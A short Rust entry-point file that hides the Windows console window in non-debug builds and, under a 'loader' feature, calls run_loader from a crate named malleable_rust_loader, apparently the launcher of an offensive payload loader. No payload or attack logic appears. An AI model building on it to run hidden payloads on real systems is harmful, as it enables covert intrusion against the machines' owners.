#![cfg_attr(
    not(any(feature = "debug", feature = "info")),
    windows_subsystem = "windows"
)]

#[cfg(feature = "loader")]
use malleable_rust_loader::run_loader;

fn main() {
    #[cfg(feature = "loader")]
    run_loader();
}
